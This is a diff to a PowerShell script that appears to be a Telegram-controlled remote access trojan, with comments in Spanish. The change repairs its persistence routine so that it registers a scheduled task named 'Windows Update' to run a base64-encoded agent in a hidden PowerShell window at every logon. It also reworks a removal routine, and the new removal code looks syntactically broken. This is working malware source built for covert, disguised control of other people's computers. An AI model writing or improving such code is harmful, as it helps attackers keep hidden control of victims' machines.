@@ -188,17 +188,17 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; 
-$accion = New-ScheduledTaskAction -Execute 'C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument '-win hidden -enc $code'
-$desencadenante = New-ScheduledTaskTrigger -Daily -AtLogOn
+$accion = New-ScheduledTaskAction -Execute "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-win hidden -enc $code"
+$desencadenante = New-ScheduledTaskTrigger -AtLogOn
 $tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet)
+$tarea | Register-ScheduledTask -TaskName "Windows Update"
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
 
 function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-{$texto = "Sorry, necesitas privilegios";return $texto; break 
-else {$texto = "Eliminando persistencia"
-.\schtasks.exe /delete /tn "Windows Update" /F; return $texto; break
+{$texto = "Sorry, necesitas privilegios";return $texto; break }; if ((Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"}).count -eq 0 ) {$texto = "El arranque parece estar limpio."; return $texto; break} else {
+else {$texto = "Eliminando persistencia" ; Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"}  | Unregister-ScheduledTask -AsJob; return $texto; break
 }}}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
